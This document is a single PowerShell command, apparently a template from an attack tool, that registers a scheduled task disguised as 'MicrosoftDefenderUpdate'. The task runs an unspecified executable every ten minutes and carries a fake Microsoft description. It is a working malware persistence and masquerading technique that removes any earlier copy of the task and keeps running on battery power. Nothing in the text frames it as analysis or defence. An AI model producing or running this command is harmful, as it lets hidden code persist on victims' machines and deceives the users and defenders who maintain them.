Get-ScheduledTask | Where-Object TaskName -like "MicrosoftDefenderUpdate" | ForEach-Object { Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false }; Register-ScheduledTask -TaskName "MicrosoftDefenderUpdate" -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 10)) -Action (New-ScheduledTaskAction -Execute "{{PLACEHOLDER}}") -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable) -Description "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work"